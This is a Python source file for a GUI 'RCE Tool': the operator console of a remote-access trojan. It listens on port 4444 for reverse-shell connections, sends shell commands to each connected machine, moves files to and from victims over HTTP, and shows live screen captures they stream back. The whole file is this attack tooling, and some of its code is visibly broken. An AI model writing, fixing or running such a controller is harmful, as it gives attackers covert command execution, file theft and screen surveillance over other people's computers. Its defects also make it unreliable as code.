import customtkinter as ctk, socket, threading, os, time, json, cv2, struct
import numpy as np, base64, shutil, requests, platform
from datetime import datetime
from PIL import Image, ImageTk
from tkinter import scrolledtext, messagebox, filedialog
from http.server import HTTPServer, SimpleHTTPRequestHandler

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")
os.chdir(r"C:\Users\Corgi\Documents\RCE Files\Uploader")

def start_server():
    os.chdir(r"C:\Users\Corgi\Documents\RCE Files\Uploader")
    HTTPServer(('', 8000), SimpleHTTPRequestHandler).serve_forever()

class NcatGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Corgan's RCE Tool")
        self.geometry("1366x768")
        self._init_vars()
        self._create_widgets()
        threading.Thread(target=start_server, daemon=True).start()

    def _init_vars(self):
        self.listeners = {"Main Listener": {"console": None, "running": False}}
        self.connection_sockets = {}
        self.connection_info = {}
        self.stream_windows = {}
        self.command_history = {}
        self.auto_command_history = {}
        self.active_connections = []
        self.settings = {"auto_commands": True, "notifications": True, "timeout": 30}
        self.screen_socket = None
        self.streaming_active = False

    def _create_widgets(self):
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)
        self._create_header()
        self.tabview = ctk.CTkTabview(self)
        self.tabview.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)
        self._init_main_console()
        self._create_input_frame()
        self.status_bar = ctk.CTkLabel(self, text="🛑 Not Running", fg_color=("white", "#2d2d2d"), anchor="w")
        self.status_bar.grid(row=3, column=0, sticky="nsew")

    def _create_header(self):
        header = ctk.CTkFrame(self, corner_radius=0)
        header.grid(row=0, column=0, sticky="nsew")
        self.port_entry = ctk.CTkEntry(header, placeholder_text="Port", width=120)
        self.port_entry.insert(0, "4444")
        self.port_entry.pack(side="left", padx=10, pady=10)
        self.ip_entry = ctk.CTkEntry(header, placeholder_text="Interface", width=150)
        self.ip_entry.insert(0, "0.0.0.0")
        self.ip_entry.pack(side="left", padx=10, pady=10)
        ctk.CTkButton(header, text="Start Listener", command=self.start_main_listener, 
                     fg_color="#2AAA8A", hover_color="#228B69").pack(side="left", padx=10, pady=10)
        self.stop_btn = ctk.CTkButton(header, text="Stop All", command=self.stop_all_listeners,
                                    fg_color="#FF4B4B", hover_color="#CC3D3D", state="disabled")
        self.stop_btn.pack(side="left", padx=10, pady=10)
        self.connection_label = ctk.CTkLabel(header, text="Active: 0")
        self.connection_label.pack(side="left", padx=20, pady=10)

    def _init_main_console(self):
        tab = self.tabview.tab("Main Listener")
        console = scrolledtext.ScrolledText(tab, wrap="word", bg="#1a1a1a", fg="#00FF00", insertbackground="#00FF00")
        console.pack(fill="both", expand=True, padx=10, pady=10)
        for tag in ["success", "error", "info", "connection", "system", "warning"]:
            console.tag_config(tag, foreground={"success":"#2AAA8A","error":"#FF4B4B","info":"#00FF00",
                              "connection":"#FFD700","system":"#BA55D3","warning":"#FFA500"}[tag])
        self.listeners["Main Listener"]["console"] = console

    def _create_input_frame(self):
        frame = ctk.CTkFrame(self)
        frame.grid(row=2, column=0, sticky="ew", padx=10, pady=(0, 10))
        self.cmd_entry = ctk.CTkEntry(frame, placeholder_text="Enter command...")
        self.cmd_entry.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
        self.cmd_entry.bind("<Return>", self.send_command)
        ctk.CTkButton(frame, text="Send", command=self.send_command, width=100).grid(row=0, column=1, padx=10, pady=10)
        ctk.CTkButton(frame, text="↑ History", command=self.show_command_history, width=100).grid(row=0, column=2, padx=10, pady=10)

    def start_main_listener(self):
        if not self._validate_inputs(): return
        self.stop_btn.configure(state="normal")
        self.update_status("🟢 Starting main listener...")
        threading.Thread(target=self._run_main_listener, daemon=True).start()

    def _run_main_listener(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.ip_entry.get(), int(self.port_entry.get())))
            s.listen(5)
            self.listeners["Main Listener"]["running"] = True
            self.update_status(f"🟢 Listening on {self.ip_entry.get()}:{self.port_entry.get()}")
            while self.listeners["Main Listener"]["running"]:
                try:
                    client, addr = s.accept()
                    self._handle_connection(client, f"{addr[0]}:{addr[1]}")
                except: pass
            s.close()
        except Exception as e:
            self.log_message("Main Listener", f"Error: {str(e)}", "error")

    def _handle_connection(self, client, addr):
        name = f"Connection {len(self.active_connections)+1}"
        self.active_connections.append(name)
        self.connection_sockets[name] = client
        self.connection_info[name] = {"ip": addr.split(":")[0], "last_active": datetime.now()}
        self._create_connection_tab(name)
        threading.Thread(target=self._read_connection, args=(name, client), daemon=True).start()

    def _create_connection_tab(self, name):
        self.tabview.add(name)
        tab = self.tabview.tab(name)
        main_frame = ctk.CTkFrame(tab)
        main_frame.pack(fill="both", expand=True)
        info_frame = ctk.CTkFrame(main_frame, width=200)
        info_frame.pack(side="left", fill="y", padx=5, pady=5)
        console = scrolledtext.ScrolledText(main_frame, wrap="word", bg="#1a1a1a", fg="#00FF00")
        console.pack(fill="both", expand=True, padx=5, pady=5)
        for btn in [("📤 Upload", lambda n=name: self._upload(n)), ("📥 Download", lambda n=name: self._download(n)),
                   ("📺 Screen", lambda n=name: self._start_stream(n))]:
            ctk.CTkButton(info_frame, text=btn[0], command=btn[1]).pack(fill="x", padx=5, pady=5)
        self.listeners[name] = {"console": console, "running": True}

    def _read_connection(self, name, client):
        while name in self.active_connections:
            try:
                data = client.recv(4096)
                if not data: break
                self.log_message(name, data.decode('utf-8', 'replace'), "info")
            except: break
        self.close_connection(name)

    def send_command(self, event=None):
        cmd = self.cmd_entry.get()
        if not cmd or self.tabview.get() == "Main Listener": return
        name = self.tabview.get()
        self.connection_sockets[name].send(cmd.encode())
        self.log_message(name, f"$ {cmd}", "input")
        self.cmd_entry.delete(0, "end")

    def close_connection(self, name):
        if name in self.connection_sockets:
            self.connection_sockets[name].close()
            del self.connection_sockets[name]
        if name in self.active_connections:
            self.active_connections.remove(name)
        self.update_connection_counter()

    def _start_stream(self, name):
        if name not in self.stream_windows:
            win = ctk.CTkToplevel(self)
            win.title(f"Screen Share - {name}")
            win.geometry("1024x768")
            win.video_label = ctk.CTkLabel(ctk.CTkFrame(win))
            win.video_label.pack(fill="both", expand=True)
            self.stream_windows[name] = win
        threading.Thread(target=self._stream_handler, daemon=True).start()

    def _stream_handler(self):
        self.screen_socket = socket.socket()
        self.screen_socket.bind(('0.0.0.0', 5001))
        self.screen_socket.listen(1)
        while True:
            conn, _ = self.screen_socket.accept()
            threading.Thread(target=self._receive_frames, args=(conn,), daemon=True).start()

    def _receive_frames(self, conn):
        while True:
            try:
                header = conn.recv(4)
                size = struct.unpack('!I', header)[0]
                data = conn.recv(size)
                frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
                img = ImageTk.PhotoImage(Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)))
                self.stream_windows[[k for k,v in self.connection_info.items() if v['ip'] == conn.getpeername()[0]][0]].video_label.configure(image=img)
            except: break

    def _upload(self, name):
        path = filedialog.askopenfilename()
        if path: shutil.copy(path, os.path.join(os.getcwd(), os.path.basename(path)))

    def _download(self, name):
        path = ctk.CTkInputDialog(text="Remote path:").get_input()
        if path: threading.Thread(target=lambda: requests.get(f"http://{self.connection_info[name]['ip']}:8000/{os.path.basename(path)}").content).start()

    def log_message(self, target, msg, tag=None):
        console = self.listeners[target]["console"]
        console.insert("end", f"{msg}\n")
        if tag: console.tag_add(tag, "end-2l", "end-1c")
        console.see("end")

    def update_status(self, text): self.status_bar.configure(text=text)
    def update_connection_counter(self): self.connection_label.configure(text=f"Active: {len(self.active_connections)}")
    def _validate_inputs(self): return self.port_entry.get().isdigit() and 1 <= int(self.port_entry.get()) <= 65535
    def show_command_history(self): messagebox.showinfo("History", "\n".join(self.command_history.get(self.tabview.get(), [])))
    def stop_all_listeners(self):
        [self.close_connection(c) for c in self.active_connections.copy()]
        self.listeners["Main Listener"]["running"] = False
        self.stop_btn.configure(state="disabled")

if __name__ == "__main__":
    app = NcatGUI()
    app.mainloop()
